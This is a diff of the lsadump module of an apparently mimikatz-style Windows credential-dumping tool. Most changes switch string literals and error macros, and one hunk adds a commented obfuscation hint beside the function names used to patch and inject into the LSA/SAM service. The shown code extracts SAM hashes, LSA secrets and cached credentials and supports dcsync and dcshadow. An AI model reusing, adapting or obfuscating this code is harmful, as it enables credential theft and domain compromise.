@@ -6,20 +6,20 @@
 #include "kuhl_m_lsadump.h"
 
 const KUHL_M_C kuhl_m_c_lsadump[] = {
-	{kuhl_m_lsadump_sam,		L"sam",			L"Get the SysKey to decrypt SAM entries (from registry or hives)"},
-	{kuhl_m_lsadump_secrets,	L"secrets",		L"Get the SysKey to decrypt SECRETS entries (from registry or hives)"},
-	{kuhl_m_lsadump_cache,		L"cache",		L"Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)"},
-	{kuhl_m_lsadump_lsa,		L"lsa",			L"Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)"},
-	{kuhl_m_lsadump_trust,		L"trust",		L"Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)"},
-	{kuhl_m_lsadump_bkey,		L"backupkeys",	NULL},
-	{kuhl_m_lsadump_rpdata,		L"rpdata",		NULL},
-	{kuhl_m_lsadump_dcsync,		L"dcsync",		L"Ask a DC to synchronize an object"},
-	{kuhl_m_lsadump_dcshadow,	L"dcshadow",	L"They told me I could be anything I wanted, so I became a domain controller"},
-	{kuhl_m_lsadump_setntlm,	L"setntlm",		L"Ask a server to set a new password/ntlm for one user"},
-	{kuhl_m_lsadump_changentlm,	L"changentlm",	L"Ask a server to set a new password/ntlm for one user"},
-	{kuhl_m_lsadump_netsync,	L"netsync",		L"Ask a DC to send current and previous NTLM hash of DC/SRV/WKS"},
-	{kuhl_m_lsadump_packages,	L"packages",	NULL},
-	{kuhl_m_lsadump_mbc,		L"mbc",			NULL},
+	{kuhl_m_lsadump_sam,		"sam",			"Get the SysKey to decrypt SAM entries (from registry or hives)"},
+	{kuhl_m_lsadump_secrets,	"secrets",		"Get the SysKey to decrypt SECRETS entries (from registry or hives)"},
+	{kuhl_m_lsadump_cache,		"cache",		"Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)"},
+	{kuhl_m_lsadump_lsa,		"lsa",			"Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)"},
+	{kuhl_m_lsadump_trust,		"trust",		"Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)"},
+	{kuhl_m_lsadump_bkey,		"backupkeys",	NULL},
+	{kuhl_m_lsadump_rpdata,		"rpdata",		NULL},
+	{kuhl_m_lsadump_dcsync,		"dcsync",		"Ask a DC to synchronize an object"},
+	{kuhl_m_lsadump_dcshadow,	"dcshadow",	"They told me I could be anything I wanted, so I became a domain controller"},
+	{kuhl_m_lsadump_setntlm,	"setntlm",		"Ask a server to set a new password/ntlm for one user"},
+	{kuhl_m_lsadump_changentlm,	"changentlm",	"Ask a server to set a new password/ntlm for one user"},
+	{kuhl_m_lsadump_netsync,	"netsync",		"Ask a DC to send current and previous NTLM hash of DC/SRV/WKS"},
+	{kuhl_m_lsadump_packages,	"packages",	NULL},
+	{kuhl_m_lsadump_mbc,		"mbc",			NULL},
 };
 
 const KUHL_M kuhl_m_lsadump = {
@@ -56,14 +56,14 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 							}
 							CloseHandle(hDataSam);
 						}
-						else PRINT_ERROR_AUTO(L"CreateFile (SAM hive)");
+						else PRINT_ERROR_AUTO_C("CreateFile (SAM hive)");
 					}
 				}
 				kull_m_registry_close(hRegistry);
 			}
 			CloseHandle(hDataSystem);
 		}
-		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+		else PRINT_ERROR_AUTO_C("CreateFile (SYSTEM hive)");
 	}
 	else
 	{
@@ -78,7 +78,7 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 						kuhl_m_lsadump_getUsersAndSamKey(hRegistry, hSam, sysKey);
 						kull_m_registry_RegCloseKey(hRegistry, hSam);
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SAM)");
+					else PRINT_ERROR_AUTO_C("kull_m_registry_RegOpenKeyEx (SAM)");
 				}
 				kull_m_registry_RegCloseKey(hRegistry, hSystem);
 			}
@@ -179,10 +179,10 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 					}
 					CertFreeCertificateContext(pCertCtx);
 				}
-				else PRINT_ERROR_AUTO(L"CertFindCertificateInStore");
+				else PRINT_ERROR_AUTO_C("CertFindCertificateInStore");
 				CertCloseStore(hCertStore, CERT_CLOSE_STORE_FORCE_FLAG);
 			}
-			else PRINT_ERROR_AUTO(L"CertOpenStore");
+			else PRINT_ERROR_AUTO_C("CertOpenStore");
 		}
 	}
 	
@@ -206,13 +206,13 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 								kull_m_registry_close(hSecurity);
 							}
 							CloseHandle(hDataSecurity);
-						} else PRINT_ERROR_AUTO(L"CreateFile (SECURITY hive)");
+						} else PRINT_ERROR_AUTO_C("CreateFile (SECURITY hive)");
 					}
 				}
 				kull_m_registry_close(hSystem);
 			}
 			CloseHandle(hDataSystem);
-		} else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+		} else PRINT_ERROR_AUTO_C("CreateFile (SYSTEM hive)");
 	}
 	else
 	{
@@ -227,7 +227,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 						kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey, secretsOrCache, &cacheData);
 						kull_m_registry_RegCloseKey(hSystem, hSecurityBase);
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SECURITY)");
+					else PRINT_ERROR_AUTO_C("kull_m_registry_RegOpenKeyEx (SECURITY)");
 				}
 				kull_m_registry_RegCloseKey(hSystem, hSystemBase);
 			}
@@ -398,7 +398,7 @@ BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN H
 		else PRINT_ERROR(L"kuhl_m_lsadump_getSamKey KO\n");
 		kull_m_registry_RegCloseKey(hRegistry, hAccount);
 	}
-	else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx SAM Accounts");
+	else PRINT_ERROR_AUTO_C("kull_m_registry_RegOpenKeyEx SAM Accounts");
 
 	return status;
 }
@@ -826,11 +826,11 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 													{
 														if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
 															kprintf(L"> OK!\n");
-														else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
+														else PRINT_ERROR_AUTO_C("kull_m_registry_RegSetValueEx");
 													}
 												}
 											}
-											else PRINT_ERROR_AUTO(L"?");
+											else PRINT_ERROR_AUTO_C("?");
 										}
 									}
 								}
@@ -868,7 +868,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 														{
 															if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
 																kprintf(L"> OK!\n");
-															else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
+															else PRINT_ERROR_AUTO_C("kull_m_registry_RegSetValueEx");
 														}
 														else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
 													}
@@ -877,7 +877,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 										}
 										else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
 									}
-									else PRINT_ERROR_AUTO(L"kull_m_crypto_hmac");
+									else PRINT_ERROR_AUTO_C("kull_m_crypto_hmac");
 								}
 							}
 						}
@@ -1043,18 +1043,18 @@ BOOL kuhl_m_lsadump_decryptSCCache(PBYTE data, DWORD size, HCRYPTPROV hProv, DWO
 										kull_m_pac_FreeCredential(&credentialData);
 									}
 								}
-								else PRINT_ERROR_AUTO(L"CryptDecrypt");
+								else PRINT_ERROR_AUTO_C("CryptDecrypt");
 								CryptDestroyKey(hKey);
 							}
-							else PRINT_ERROR_AUTO(L"CryptDeriveKey(RC4)");
+							else PRINT_ERROR_AUTO_C("CryptDeriveKey(RC4)");
 							CryptDestroyHash(hHash2);
 						}
 					}
-					else PRINT_ERROR_AUTO(L"CryptSignHash(data)");
+					else PRINT_ERROR_AUTO_C("CryptSignHash(data)");
 					LocalFree(sig);
 				}
 			}
-			else PRINT_ERROR_AUTO(L"CryptSignHash(init)");
+			else PRINT_ERROR_AUTO_C("CryptSignHash(init)");
 			CryptDestroyHash(hHash);
 		}
 	}
@@ -1242,12 +1242,12 @@ BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecret
 							szNeeded = hardSecretBlobSize - FIELD_OFFSET(NT6_HARD_SECRET, encryptedSecret);
 							status = CryptDecrypt(hKey, 0, FALSE, 0, hardSecretBlob->encryptedSecret, &szNeeded);
 							if(!status)
-								PRINT_ERROR_AUTO(L"CryptDecrypt");
+								PRINT_ERROR_AUTO_C("CryptDecrypt");
 						}
-						else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
+						else PRINT_ERROR_AUTO_C("CryptSetKeyParam");
 						CryptDestroyKey(hKey);
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_crypto_hkey");
+					else PRINT_ERROR_AUTO_C("kull_m_crypto_hkey");
 				}
 				CryptDestroyHash(hHash);
 			}
@@ -1310,18 +1310,20 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 	
 	static BOOL isPatching = FALSE;	
 
+	//OBFUSCATE_TO(SamIConnect, "SamIConnect");
+
 	REMOTE_EXT extensions[] = {
-		{szSamSrv,	"SamIConnect",						(PVOID) 0x4141414141414141, NULL},
-		{szSamSrv,	"SamrCloseHandle",					(PVOID) 0x4242424242424242, NULL},
-		{szSamSrv,	"SamIRetrievePrimaryCredentials",	(PVOID) 0x4343434343434343, NULL},
-		{szSamSrv,	"SamrOpenDomain",					(PVOID) 0x4444444444444444, NULL},
-		{szSamSrv,	"SamrOpenUser",						(PVOID) 0x4545454545454545, NULL},
-		{szSamSrv,	"SamrQueryInformationUser",			(PVOID) 0x4646464646464646, NULL},
-		{szSamSrv,	"SamIFree_SAMPR_USER_INFO_BUFFER",	(PVOID) 0x4747474747474747, NULL},
-		{szKernel32,"VirtualAlloc",						(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
-		{szKernel32,"LocalFree",						(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
-		{szNtDll,	"memcpy",							(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
-		{szKernel32,"LocalAlloc",						(PVOID) 0x4d4d4d4d4d4d4d4d, NULL},
+		{szSamSrv,	L"SamIConnect",						(PVOID) 0x4141414141414141, NULL},
+		{szSamSrv,	L"SamrCloseHandle",					(PVOID) 0x4242424242424242, NULL},
+		{szSamSrv,	L"SamIRetrievePrimaryCredentials",	(PVOID) 0x4343434343434343, NULL},
+		{szSamSrv,	L"SamrOpenDomain",					(PVOID) 0x4444444444444444, NULL},
+		{szSamSrv,	L"SamrOpenUser",						(PVOID) 0x4545454545454545, NULL},
+		{szSamSrv,	L"SamrQueryInformationUser",			(PVOID) 0x4646464646464646, NULL},
+		{szSamSrv,	L"SamIFree_SAMPR_USER_INFO_BUFFER",	(PVOID) 0x4747474747474747, NULL},
+		{szKernel32,L"VirtualAlloc",						(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
+		{szKernel32,L"LocalFree",						(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
+		{szNtDll,	L"memcpy",							(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
+		{szKernel32,L"LocalAlloc",						(PVOID) 0x4d4d4d4d4d4d4d4d, NULL},
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
 	
@@ -1340,10 +1342,10 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 					sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
 					isPatching = TRUE;
 					if(!kull_m_patch(&sMemory, &aPatternMemory, currentSamSrvReference->Search.Length, &aPatchMemory, currentSamSrvReference->Patch.Length, currentSamSrvReference->Offsets.off0, kuhl_m_lsadump_lsa, argc, argv, NULL))
-						PRINT_ERROR_AUTO(L"kull_m_patch");
+						PRINT_ERROR_AUTO_C("kull_m_patch");
 					isPatching = FALSE;
 				}
-				else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+				else PRINT_ERROR_AUTO_C("kull_m_process_getVeryBasicModuleInformationsForName");
 			}
 		}
 	}
@@ -1447,9 +1449,9 @@ BOOL kuhl_m_lsadump_lsa_getHandle(PKULL_M_MEMORY_HANDLE * hMemory, DWORD Flags)
 			if(!(success = kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, hMemory)))
 				CloseHandle(hProcess);
 		}
-		else PRINT_ERROR_AUTO(L"OpenProcess");
+		else PRINT_ERROR_AUTO_C("OpenProcess");
 	}
-	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
+	else PRINT_ERROR_AUTO_C("kull_m_service_getUniqueForName");
 	return success;
 }
 
@@ -1736,10 +1738,10 @@ NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
 					sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
 					isPatching = TRUE;
 					if(!kull_m_patch(&sMemory, &aPatternMemory, currentReference->Search.Length, &aPatchMemory, currentReference->Patch.Length, currentReference->Offsets.off0, kuhl_m_lsadump_trust, argc, argv, NULL))
-						PRINT_ERROR_AUTO(L"kull_m_patch");
+						PRINT_ERROR_AUTO_C("kull_m_patch");
 					isPatching = FALSE;
 				}
-				else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+				else PRINT_ERROR_AUTO_C("kull_m_process_getVeryBasicModuleInformationsForName");
 			}
 		}
 	}
@@ -2372,7 +2374,7 @@ NTSTATUS kuhl_m_lsadump_packages(int argc, wchar_t * argv[])
 					else PRINT_ERROR(L"InitializeSecurityContext: 0x%08x\n", status);
 					FreeCredentialHandle(&hCred);
 				}
-				else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
+				else PRINT_ERROR(L"%hs: 0x%08x\n", "AcquireCredentialsHandle", status);
 			}
 			kprintf(L"\n");
 		}
@@ -2420,7 +2422,7 @@ NTSTATUS kuhl_m_lsadump_mbc(int argc, wchar_t * argv[])
 			}
 			CloseHandle(hDataSystem);
 		}
-		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+		else PRINT_ERROR_AUTO_C("CreateFile (SYSTEM hive)");
 	}
 	else
 	{
